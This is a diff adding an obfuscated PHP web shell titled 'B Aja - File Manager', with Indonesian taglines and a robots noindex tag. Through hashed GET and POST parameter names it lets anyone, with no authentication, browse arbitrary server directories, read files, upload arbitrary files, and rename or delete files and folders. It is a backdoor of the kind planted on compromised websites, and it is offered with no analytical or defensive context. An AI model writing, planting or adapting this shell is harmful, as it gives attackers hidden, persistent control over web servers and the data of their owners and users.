@@ -1,0 +1,133 @@
+<head>
+    <meta name="robots" content="noindex, nofollow">
+    <title>B 4ja S!h</title>
+</head>
+<body>
+<h1>B Aja - File Manager</h1>
+<h2>Nggk Ganteng, Nggk Kaya, Nggk Pinter Intinya B aja</h2>
+
+<?php
+if (isset($_GET["Sd99d544e"])) {
+    $Sd99d544e = $_GET["Sd99d544e"];
+    echo '<form method="POST">';
+    echo '<input type="text" name="S50b8ae71" value="' . $Sd99d544e . '">';
+    echo '<input type="submit" value="Rename">';
+    echo '</form>';
+}
+if (!isset($_GET["Seca209cd"])) {
+    $Sbaab7a10 = __DIR__;
+} else {
+    $Sbaab7a10 = $_GET["Seca209cd"];
+}
+if (isset($_GET["Se470bf39"]) && isset($_POST["S6e90947a"])) {
+    $Se470bf39 = $_GET["Se470bf39"];
+    $S1e10df1b = $_POST["S6e90947a"];
+    $S0b548b0f = pathinfo($Se470bf39, PATHINFO_DIRNAME);
+    if (rename("{$Se470bf39}", "{$S0b548b0f}/{$S1e10df1b}")) {
+        echo "<script>alert('Succeed')</script>";
+    } else {
+        echo "<script>alert('Failed')</script>";
+    }
+}
+if (isset($_GET["S234f9e92"])) {
+    $S234f9e92 = $_GET["S234f9e92"];
+    if (is_file("{$Sbaab7a10}/{$S234f9e92}")) {
+        if (unlink("{$Sbaab7a10}/{$S234f9e92}")) {
+            echo "<script>alert('Succeed')</script>";
+        } else {
+            echo "<script>alert('Failed')</script>";
+        }
+    } elseif (is_dir("{$Sbaab7a10}/{$S234f9e92}")) {
+        if (rmdir("{$Sbaab7a10}/{$S234f9e92}")) {
+            echo "<script>alert('Succeed')</script>";
+        } else {
+            echo "<script>alert('Failed')</script>";
+        }
+    }
+}
+echo '</ul>';
+if (isset($_GET["S4877605c"])) {
+    $S4877605c = $_GET["S4877605c"];
+    echo '<form method="POST">';
+    echo '<input type="text" name="S6e90947a">';
+    echo '<input type="submit" value="Add">';
+    echo '</form>';
+}
+echo '<input type="file" name="S8c9f3610">';
+if (isset($_GET["S228e3120"])) {
+    $S228e3120 = $_GET["S228e3120"];
+    if (rmdir("{$S228e3120}")) {
+        echo "<script>alert('Succeed')</script>";
+    } else {
+        echo "<script>alert('Failed')</script>";
+    }
+}
+echo '<input type="submit" value="Upload">';
+if (isset($_FILES["S8c9f3610"])) {
+    $S8c9f3610 = $_FILES["S8c9f3610"]["name"];
+    $Sbbe3d1f1 = $_FILES["S8c9f3610"]["tmp_name"];
+    if (move_uploaded_file($Sbbe3d1f1, "{$Sbaab7a10}/{$S8c9f3610}")) {
+        echo "<script>alert('Succeed')</script>";
+    } else {
+        echo "<script>alert('Failed')</script>";
+    }
+}
+if (isset($_GET["Sfa454596"])) {
+    $Sfa454596 = $_GET["Sfa454596"];
+    echo '<form method="POST">';
+    echo '<input type="text" value="nama" name="S50b8ae71">';
+    echo '<input type="submit" value="Add">';
+    echo '</form>';
+}
+if (isset($_GET["Se470bf39"])) {
+    $Se470bf39 = $_GET["Se470bf39"];
+    echo '<form method="POST">';
+    echo '<input type="text" name="S6e90947a" value="' . basename($Se470bf39) . '">';
+    echo '<input type="submit" value="Rename Folder">';
+    echo '</form>';
+}
+if (isset($_GET["S8c9f3610"])) {
+    $S8c9f3610 = $_GET["S8c9f3610"];
+    $Sfec530a9 = file_get_contents("{$Sbaab7a10}/{$S8c9f3610}");
+    echo '<form method="POST">';
+    echo '<textarea name="Sfec530a9" rows="10" cols="80">' . htmlspecialchars($Sfec530a9) . '</textarea><br>';
+    echo '<input type="submit" value="Simpan">';
+    echo '</form>';
+}
+echo '<form method="POST" enctype="multipart/form-data">';
+if (isset($_POST["S50b8ae71"])) { 
+    $S81cdfaea = $_POST["S50b8ae71"]; 
+} 
+$Sf3b0f2f1 = scandir($Sbaab7a10); 
+if ( 
+    isset($_GET["S4877605c"]) && 
+    isset($_POST["S6e90947a"]) 
+) { 
+    $S4877605c = $_GET["S4877605c"]; 
+    $S6e90947a = $_POST["S6e90947a"]; 
+    if (mkdir("{$S4877605c}/{$S6e90947a}")) { 
+        echo "<script>alert('Succeed')</script>"; 
+    } else { 
+        echo "<script>alert('Failed')</script>"; 
+    } 
+} 
+if (isset($_POST["S6e90947a"])) { 
+    $S1e10df1b = $_POST["S6e90947a"]; 
+}  
+foreach ($Sf3b0f2f1 as $S8c9f3610) { 
+    if (is_dir("{$Sbaab7a10}/{$S8c9f3610}")) { 
+        if ($S8c9f3610 == "." || $S8c9f3610 == "..") { 
+            echo "<a href='?Seca209cd={$Sbaab7a10}/{$S8c9f3610}'>{$S8c9f3610}/</a> | <a href='?Seca209cd={$Sbaab7a10}&S4877605c={$Sbaab7a10}/{$S8c9f3610}'>Add Folder</a> | <a href='?Seca209cd={$Sbaab7a10}&Sfa454596={$Sbaab7a10}/{$S8c9f3610}'>Add File</a></br>"; 
+        } else { 
+            echo "<a href='?Seca209cd={$Sbaab7a10}/{$S8c9f3610}''>{$S8c9f3610}/</a> | <a href='?Seca209cd={$Sbaab7a10}&S228e3120={$Sbaab7a10}/{$S8c9f3610}''>Delete</a> | <a href='?Seca209cd={$Sbaab7a10}&Se470bf39={$Sbaab7a10}/{$S8c9f3610}'>Rename Folder</a></br>"; 
+        } 
+    } elseif (is_file("{$Sbaab7a10}/{$S8c9f3610}")) { 
+        echo "<a href='?Seca209cd={$Sbaab7a10}&S8c9f3610={$S8c9f3610}'>{$S8c9f3610}</a> | <a href='?Seca209cd={$Sbaab7a10}&S234f9e92={$S8c9f3610}'>Delete</a> | <a href='?Seca209cd={$Sbaab7a10}&Sd99d544e={$S8c9f3610}'>Rename</a></br>"; 
+    } 
+} ;
+ ?>
+
+
+<i>~ Menungso Biasa ~</i>
+</body>
+</html>
